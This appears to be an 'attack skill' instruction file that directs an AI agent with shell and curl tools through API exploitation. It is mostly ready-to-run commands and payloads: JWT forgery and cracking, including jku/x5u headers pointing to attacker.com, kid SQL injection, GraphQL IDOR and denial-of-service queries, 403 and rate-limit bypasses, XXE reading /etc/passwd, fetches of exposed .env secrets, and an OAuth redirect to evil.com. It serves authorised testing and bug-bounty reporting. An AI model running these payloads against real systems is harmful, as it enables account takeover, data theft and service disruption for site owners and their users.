# ATTACK SKILL: API SECURITY TESTING

## Overview
Advanced API security testing workflow covering JWT exploitation, GraphQL attacks, REST API vulnerabilities, with real-world HackerOne report references and proven exploitation techniques.

## Tools Available
- **kali_shell** - Execute jwt_tool, graphql-cop, graphqlmap, ffuf, httpx, curl
- **execute_curl** - HTTP requests for API testing
- **execute_code** - Custom exploit scripts

---

## REAL-WORLD HACKERONE REFERENCES

### JWT Vulnerabilities
| Report | Target | Vulnerability | Bounty |
|--------|--------|---------------|--------|
| [#1889161](https://hackerone.com/reports/1889161) | Argo CD | JWT audience claim not verified | - |
| [#853145](https://hackerone.com/reports/853145) | Semrush | Broken JWT user ID validation | - |
| [#1760403](https://hackerone.com/reports/1760403) | Linktree | Account takeover via expired JWT bypass | - |
| [#638635](https://hackerone.com/reports/638635) | Trint | Hardcoded JWT secret in JavaScript | - |
| [#1210502](https://hackerone.com/reports/1210502) | 8x8/Jitsi | Auth bypass via symmetric JWT validation | - |

### GraphQL Vulnerabilities
| Report | Target | Vulnerability | Bounty |
|--------|--------|---------------|--------|
| [#291531](https://hackerone.com/reports/291531) | HackerOne | Introspection query data leak | - |
| [#2207248](https://hackerone.com/reports/2207248) | Shopify | IDOR on BillingInvoice GraphQL | - |
| [#2218334](https://hackerone.com/reports/2218334) | HackerOne | IDOR in Copilot GraphQL mutation | - |
| [#489146](https://hackerone.com/reports/489146) | HackerOne | Data breach via GraphQL endpoint | - |
| [#717716](https://hackerone.com/reports/717716) | HackerOne | IDOR in Gateway mutation | - |
| [#862835](https://hackerone.com/reports/862835) | Nuri | Introspection via unauthenticated WebSocket | - |
| [#1132803](https://hackerone.com/reports/1132803) | On | GraphQL introspection enabled | - |
| [#2048725](https://hackerone.com/reports/2048725) | Sorare | Circular introspection query bypass | - |
| [#2886723](https://hackerone.com/reports/2886723) | Shopify | GraphQL introspection on storefront | - |

### 403/401 Bypass Vulnerabilities
| Report | Target | Vulnerability | Bounty |
|--------|--------|---------------|--------|
| [#737323](https://hackerone.com/reports/737323) | Clario | X-Rewrite-URL header bypass | - |
| [#1357948](https://hackerone.com/reports/1357948) | Kubernetes | Path manipulation auth bypass | - |
| [#991717](https://hackerone.com/reports/991717) | U.S. DoD | 403 bypass via misconfiguration | - |
| [#1224089](https://hackerone.com/reports/1224089) | Acronis | IP restriction bypass (X-Forwarded-For) | - |
| [#2081930](https://hackerone.com/reports/2081930) | HackerOne | Report submit restriction bypass | - |

---

## PHASE 1: API RECONNAISSANCE

### 1.1 Identify API Endpoints
```bash
# Fuzz for API paths
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,301,302,401,403

# Check common API documentation endpoints
httpx -l urls.txt -path "/swagger.json,/openapi.json,/api-docs,/graphql,/v1/api-docs" -mc 200
```

### 1.2 HTTP Probing
```bash
# Probe with detailed output
httpx -u https://target.com/api -status-code -content-length -title -tech-detect -json

# Check security headers
httpx -u https://target.com/api -include-response-header "Authorization,X-API-Key,Set-Cookie"
```

---

## PHASE 2: JWT EXPLOITATION

### 2.1 JWT Analysis
```bash
# Decode and analyze JWT structure
jwt_tool <TOKEN>

# Full vulnerability scan (tests all known attacks)
jwt_tool <TOKEN> -M at

# Quick tampering check
jwt_tool <TOKEN> -C
```

### 2.2 Algorithm Confusion Attacks

**Attack 1: alg:none (CVE-2015-9235)**
```bash
# Remove signature requirement entirely
# Reference: Many JWT libraries accepted "none" algorithm
jwt_tool <TOKEN> -X a

# Manual payload:
# Header: {"alg":"none","typ":"JWT"}
# Signature: (empty)
```

**Attack 2: RS256 to HS256 Key Confusion**
```bash
# If server expects RS256 but accepts HS256, use public key as HMAC secret
# First, extract public key from /jwks.json or /.well-known/jwks.json
curl -s https://target.com/.well-known/jwks.json | jq

# Convert JWK to PEM and use as HMAC key
jwt_tool <TOKEN> -X k -pk public_key.pem
```

**Attack 3: JWK Header Injection (CVE-2018-0114)**
```bash
# Inject attacker-controlled JWK in token header
jwt_tool <TOKEN> -X i
```

**Attack 4: JWKS Spoofing**
```bash
# Host malicious JWKS and inject jku header
jwt_tool <TOKEN> -X s -ju https://attacker.com/.well-known/jwks.json
```

### 2.3 JWT Secret Cracking
```bash
# Dictionary attack
jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets wordlist
cat << 'EOF' > jwt_secrets.txt
secret
password
123456
your-256-bit-secret
secret_key
jwt_secret
api_secret
supersecret
changeme
your-secret-key
HS256-secret
qwerty
admin
test
EOF
jwt_tool <TOKEN> -C -d jwt_secrets.txt
```

### 2.4 JWT Claim Tampering
```bash
# Escalate privileges by modifying role
jwt_tool <TOKEN> -T -S hs256 -p "discovered_secret" -pc role -pv admin

# Change user ID (IDOR via JWT)
jwt_tool <TOKEN> -T -S hs256 -p "discovered_secret" -pc sub -pv "admin_user_id"

# Bypass expiration
jwt_tool <TOKEN> -T -S hs256 -p "discovered_secret" -pc exp -pv 9999999999

# Add admin claim
jwt_tool <TOKEN> -T -S hs256 -p "discovered_secret" -I -pc is_admin -pv true
```

### 2.5 Real-World Attack Pattern (Based on #1760403)
```bash
# Linktree-style: Backends not validating expiration properly
# 1. Capture valid JWT
# 2. Modify exp claim to past timestamp
# 3. Some backends skip exp validation

jwt_tool <TOKEN> -T -S hs256 -p "" -pc exp -pv 1

# If accepted, backend has broken exp validation
```

### 2.6 Advanced JWT Bypasses

**Attack 5: kid Parameter SQL Injection**
```bash
# Reference: https://pentesterlab.com/glossary/jwt-kid-injection
# If kid is used in SQL query to fetch key, inject to control the secret

# Force use of known secret via UNION injection
jwt_tool <TOKEN> -I -hc kid -hv "aaa' UNION SELECT 'attacker_secret';--"

# Null-byte injection
jwt_tool <TOKEN> -I -hc kid -hv "../../dev/null"

# Manual header modification:
# {"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'secret'--"}
```

**Attack 6: kid Path Traversal to /dev/null**
```bash
# Reference: HackTricks JWT attacks
# Sign with empty string by pointing to empty file
jwt_tool <TOKEN> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""

# Alternative: point to known static file
jwt_tool <TOKEN> -I -hc kid -hv "../../../../var/www/html/index.html"
```

**Attack 7: x5u Header Injection**
```bash
# Similar to jku - point to attacker-controlled X.509 certificate URL
jwt_tool <TOKEN> -X s -x5u https://attacker.com/cert.pem
```

**Attack 8: Blank Password / Empty Key**
```bash
# Some implementations accept empty secrets
jwt_tool <TOKEN> -T -S hs256 -p ""
jwt_tool <TOKEN> -T -S hs384 -p ""
jwt_tool <TOKEN> -T -S hs512 -p ""
```

---

## PHASE 3: GRAPHQL EXPLOITATION

### 3.1 GraphQL Detection & Introspection
```bash
# Run security audit
graphql-cop -t https://target.com/graphql

# With authentication
graphql-cop -t https://target.com/graphql -H '{"Authorization": "Bearer TOKEN"}'

# Check for introspection (should be disabled in production)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

### 3.2 Schema Extraction via Introspection
```bash
# Full introspection query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name } } } } } }"}'

# Using graphqlmap
graphqlmap -u https://target.com/graphql --dump
```

### 3.3 GraphQL IDOR Attacks

**Pattern from #2207248 (Shopify):**
```graphql
# Enumerate billing invoices across tenants
query {
  billingInvoice(id: "gid://shopify/BillingInvoice/1") {
    id
    amount
    customerEmail
  }
}

# Increment IDs
query {
  billingInvoice(id: "gid://shopify/BillingInvoice/2") { ... }
  billingInvoice(id: "gid://shopify/BillingInvoice/3") { ... }
}
```

**Pattern from #2218334 (HackerOne Copilot):**
```graphql
# IDOR in mutation - delete other users' data
mutation {
  DestroyLlmConversation(input: { conversationId: "OTHER_USER_CONVERSATION_ID" }) {
    success
  }
}
```

**Pattern from #717716 (HackerOne Gateway):**
```graphql
# IDOR in state mutation - affect other programs
mutation {
  UpdateGatewayProgramStateMutation(input: {
    programId: "OTHER_PROGRAM_ID",
    state: "suspended"
  }) {
    success
  }
}
```

### 3.4 GraphQL Injection
```bash
# Using graphqlmap for SQL injection through GraphQL
graphqlmap -u https://target.com/graphql

# Manual injection test
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(name: \"admin'\'' OR '\''1'\''='\''1\") { id email } }"}'
```

### 3.5 GraphQL DoS Attacks

**Batching Attack:**
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"},
  // ... repeat 1000+ times
]
```

**Alias Attack:**
```graphql
query {
  a1: user(id: 1) { email }
  a2: user(id: 2) { email }
  a3: user(id: 3) { email }
  # ... repeat with unique aliases
}
```

**Deep Nesting Attack:**
```graphql
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            # Deep recursion causes resource exhaustion
          }
        }
      }
    }
  }
}
```

### 3.6 Introspection Disabled Bypass
```bash
# When introspection is disabled, use field suggestions
# GraphQL returns "Did you mean X?" errors

# Probe common query names
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users }"}'
# Error: "Did you mean 'user' or 'userList'?"

# Common queries to probe:
# user, users, me, currentUser, viewer
# admin, admins, staff
# order, orders, invoice, invoices
# payment, payments, transaction
# secret, config, settings
```

### 3.7 Advanced GraphQL Bypasses

**Bypass 1: Special Character After __schema**
```bash
# Reference: HackTricks GraphQL bypasses
# Developers often use regex to block "__schema" - bypass with special chars

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema%0a{ types { name } } }"}'

# Try various encodings:
# __schema%20 (space)
# __schema%09 (tab)
# __schema%0d%0a (CRLF)
# __schema/**/ (comment)
```

**Bypass 2: WebSocket Introspection (Based on #862835)**
```bash
# Reference: HackerOne Report #862835 - Nuri
# Introspection blocked on HTTP but allowed on WebSocket

# Use websocat or wscat
websocat wss://target.com/graphql-ws
# Send: {"type":"start","id":"1","payload":{"query":"{ __schema { types { name } } }"}}
```

**Bypass 3: Clairvoyance Schema Recovery**
```bash
# When introspection is fully disabled, recover schema from error messages
# Tool: https://github.com/nikitastupin/clairvoyance

clairvoyance https://target.com/graphql -o schema.json -w /usr/share/seclists/Discovery/Web-Content/graphql-fields.txt
```

**Bypass 4: GET Request Instead of POST**
```bash
# Some servers block introspection on POST but allow GET
curl "https://target.com/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D"
```

**Bypass 5: 403 Bypass with Bad Characters**
```bash
# Insert special characters in field names - may trigger DEBUG mode
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user\x00s { email } }"}'
```

**Bypass 6: Batching to Bypass Rate Limits**
```bash
# Reference: HackerOne Report #2048725 - Sorare
# Circular introspection via batching

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},...]'
```

---

## PHASE 4: REST API ATTACKS

### 4.1 403/401 Bypass Techniques

**Real HackerOne References:**
| Report | Target | Technique | Result |
|--------|--------|-----------|--------|
| [#737323](https://hackerone.com/reports/737323) | Clario | X-Rewrite-URL header | 403 → 200 |
| [#1357948](https://hackerone.com/reports/1357948) | Kubernetes | ../ path manipulation | Auth bypass |
| [#991717](https://hackerone.com/reports/991717) | U.S. DoD | Server misconfiguration | 403 bypass |
| [#1224089](https://hackerone.com/reports/1224089) | Acronis | X-Forwarded-For: 127.0.0.1 | IP restriction bypass |

**Bypass 1: Header Injection (Based on #737323)**
```bash
# X-Original-URL and X-Rewrite-URL bypass front-end restrictions
# Back-end processes these headers while front-end doesn't check them

curl https://target.com/anything -H "X-Original-URL: /admin"
curl https://target.com/anything -H "X-Rewrite-URL: /admin"
curl https://target.com/ -H "X-Original-URL: /api/admin/users"
```

**Bypass 2: IP Spoofing Headers (Based on #1224089)**
```bash
# Bypass IP whitelist restrictions
curl https://target.com/api/admin -H "X-Forwarded-For: 127.0.0.1"
curl https://target.com/api/admin -H "X-Forwarded-For: 127.0.0.1:80"
curl https://target.com/api/admin -H "X-Real-IP: 127.0.0.1"
curl https://target.com/api/admin -H "X-Originating-IP: 127.0.0.1"
curl https://target.com/api/admin -H "X-Remote-IP: 127.0.0.1"
curl https://target.com/api/admin -H "X-Remote-Addr: 127.0.0.1"
curl https://target.com/api/admin -H "X-Client-IP: 127.0.0.1"
curl https://target.com/api/admin -H "X-Host: localhost"
curl https://target.com/api/admin -H "Forwarded: for=127.0.0.1"
```

**Bypass 3: Path Manipulation (Based on #1357948)**
```bash
# URL path tricks to bypass access controls
curl https://target.com/api/admin/users/../users      # Path traversal
curl https://target.com/api/admin//users              # Double slash
curl https://target.com/api/admin/./users             # Current dir
curl https://target.com/api/admin/users/              # Trailing slash
curl https://target.com/api/admin/users%2f            # URL-encoded slash
curl https://target.com/api/admin/users%00            # Null byte
curl https://target.com/api/admin/users..;/           # Spring bypass
curl https://target.com/api/admin/users;.css          # Extension bypass
curl https://target.com/api/admin/users?               # Query string
curl https://target.com/api/admin/users??             # Double query
curl https://target.com/api/admin/users#              # Fragment
curl https://target.com/api/admin/users/*             # Wildcard
```

**Bypass 4: Case & Encoding Variations**
```bash
# Case sensitivity bypass
curl https://target.com/api/ADMIN/users
curl https://target.com/api/Admin/users
curl https://target.com/api/aDmIn/users

# URL encoding bypass
curl https://target.com/api/%61dmin/users             # 'a' encoded
curl https://target.com/api/adm%69n/users             # 'i' encoded
curl https://target.com/api/%2561dmin/users           # Double encoding

# Unicode normalization bypass
curl https://target.com/api/ａdmin/users              # Fullwidth 'a'
curl https://target.com/api/аdmin/users               # Cyrillic 'a'
```

**Bypass 5: HTTP Method Override**
```bash
# Method override headers
curl -X POST https://target.com/api/admin -H "X-HTTP-Method-Override: GET"
curl -X POST https://target.com/api/admin -H "X-HTTP-Method: GET"
curl -X POST https://target.com/api/admin -H "X-Method-Override: GET"

# Try all HTTP methods
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method https://target.com/api/admin
  echo
done
```

**Bypass 6: Referer & Origin Manipulation**
```bash
curl https://target.com/api/admin -H "Referer: https://target.com/admin"
curl https://target.com/api/admin -H "Origin: https://admin.target.com"
curl https://target.com/api/admin -H "Referer: https://localhost"
```

### 4.2 BOLA/IDOR Testing
```bash
# Sequential ID enumeration
for i in {1..100}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/users/$i" \
    -H "Authorization: Bearer TOKEN")
  echo "ID $i: $response"
done

# UUID guessing (check for predictable patterns)
curl "https://target.com/api/users/00000000-0000-0000-0000-000000000001"
```

### 4.3 Mass Assignment
```bash
# Add privileged fields in request
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test",
    "email": "test@test.com",
    "role": "admin",
    "isAdmin": true,
    "verified": true,
    "permissions": ["*"]
  }'

# On update endpoints
curl -X PUT https://target.com/api/users/me \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

### 4.4 API Versioning Bypass
```bash
# Find older, less secure API versions
ffuf -u "https://target.com/api/vFUZZ/users" -w <(seq 1 10) -mc 200,301,302

# Common version patterns
curl https://target.com/api/v1/admin  # Old version may lack auth
curl https://target.com/api/v2/admin  # Current version has auth
curl https://target.com/api/beta/admin
curl https://target.com/api/internal/admin
```

---

## PHASE 5: API FUZZING

### 5.1 Parameter Discovery
```bash
# Fuzz for hidden parameters
ffuf -u "https://target.com/api/users?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 -fs 0

# JSON body parameter fuzzing
ffuf -u https://target.com/api/user \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"FUZZ": "test"}' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

### 5.2 Endpoint Discovery
```bash
# API endpoint fuzzing
ffuf -u https://target.com/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403,405

# With authentication
ffuf -u https://target.com/api/FUZZ \
  -H "Authorization: Bearer TOKEN" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
```

---

## PHASE 6: ADVANCED TECHNIQUES

### 6.1 Rate Limit Bypass
```bash
# Rotate bypass headers
for ip in 1.1.1.{1..255}; do
  curl https://target.com/api/login \
    -H "X-Forwarded-For: $ip" \
    -H "X-Real-IP: $ip" \
    -d '{"user":"admin","pass":"test"}'
done
```

### 6.2 HTTP Method Tampering
```bash
# Test all methods on protected endpoint
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method https://target.com/api/admin
  echo
done
```

### 6.3 Content-Type Manipulation
```bash
# XXE via content-type switch
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>'

# JSON to XML parser confusion
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/xml" \
  -d '<user><name>admin</name><role>admin</role></user>'
```

### 6.4 WAF Bypass Techniques
```bash
# HTTP Parameter Pollution (HPP)
curl "https://target.com/api/user?id=1&id=admin"
curl "https://target.com/api/user?id=1,admin"

# Chunked Transfer Encoding bypass
curl -X POST https://target.com/api/user \
  -H "Transfer-Encoding: chunked" \
  -d $'7\r\n{"id":1\r\n0\r\n\r\n'

# Content-Type boundary confusion
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json; charset=utf-7" \
  -d '{"role": "+ACI-admin+ACI-"}'

# Null byte injection
curl "https://target.com/api/admin%00.json"
curl "https://target.com/api/admin.php%00.jpg"

# Unicode normalization
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"role": "ａｄｍｉｎ"}'  # Fullwidth chars

# Case switching to bypass filters
curl -X POST https://target.com/api/user \
  -d 'rOlE=admin'
```

### 6.5 API Key/Token Extraction Patterns
```bash
# Check JavaScript files for hardcoded secrets
# Reference: HackerOne Report #638635 (Trint - JWT secret in JS)

# Grep for common patterns
curl -s https://target.com/main.js | grep -Ei "(api[_-]?key|apikey|secret|token|jwt|bearer|auth)"

# Check .env files exposed
curl https://target.com/.env
curl https://target.com/.env.local
curl https://target.com/.env.production
curl https://target.com/config.json
curl https://target.com/settings.json

# Check source maps
curl https://target.com/main.js.map
```

### 6.6 OAuth/OIDC Attack Patterns
```bash
# Open Redirect in redirect_uri
curl "https://target.com/oauth/authorize?client_id=XXX&redirect_uri=https://evil.com&response_type=code"

# Path traversal in redirect_uri
curl "https://target.com/oauth/authorize?redirect_uri=https://target.com/../evil.com"

# Fragment injection
curl "https://target.com/oauth/authorize?redirect_uri=https://target.com#access_token=stolen"

# State parameter CSRF
curl "https://target.com/oauth/authorize?state=predictable_value"
```

---

## OWASP API SECURITY TOP 10 (2023) CHECKLIST

| # | Vulnerability | Test Method | Tool |
|---|---------------|-------------|------|
| API1 | Broken Object Level Auth | IDOR testing | curl, ffuf |
| API2 | Broken Authentication | JWT attacks | jwt_tool |
| API3 | Broken Object Property Auth | Mass assignment | curl |
| API4 | Unrestricted Resource Consumption | Rate limit, batching | curl |
| API5 | Broken Function Level Auth | Privilege escalation | curl |
| API6 | Unrestricted Access to Sensitive Flows | Business logic | manual |
| API7 | Server-Side Request Forgery | SSRF payloads | curl |
| API8 | Security Misconfiguration | Introspection, debug | graphql-cop |
| API9 | Improper Inventory Management | Version fuzzing | ffuf |
| API10 | Unsafe Consumption of APIs | Third-party abuse | manual |

---

## OUTPUT FORMAT

Report findings with:
- **Vulnerability**: Specific issue (e.g., "JWT alg:none accepted")
- **Affected endpoint**: Full URL and method
- **Reproduction**: Working curl/tool command
- **Impact**: Data exposed, privilege escalation, etc.
- **HackerOne Reference**: Similar disclosed report if applicable
- **CVSS Score**: Estimated severity
- **Remediation**: Specific fix recommendation

**Example:**
```
## JWT Algorithm Confusion

**Vulnerability:** Server accepts RS256 tokens signed with public key as HS256
**Endpoint:** POST /api/auth/verify
**Reproduction:** jwt_tool <TOKEN> -X k -pk public.pem
**Impact:** Full authentication bypass, any user impersonation
**Reference:** Similar to CVE-2015-9235
**CVSS:** 9.8 (Critical)
**Remediation:** Explicitly verify expected algorithm in JWT library config
```
